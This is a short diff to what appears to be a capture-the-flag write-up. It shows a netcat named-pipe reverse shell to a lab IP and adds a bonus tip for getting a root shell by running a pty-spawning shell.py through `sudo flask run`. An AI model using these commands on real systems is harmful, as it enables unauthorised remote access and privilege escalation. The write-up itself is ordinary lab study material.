@@ -35,3 +35,5 @@ main = system "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.5.4 4
     c. running `sudo /usr/bin/flask run`
 
 Easy, but interesting!
+
+**BONUS:** for step six, rather than catching a root reverse shell, changing shell.py to contain `import pty; pty.spawn('/bin/bash')` works as well, spawing an instant root shell.
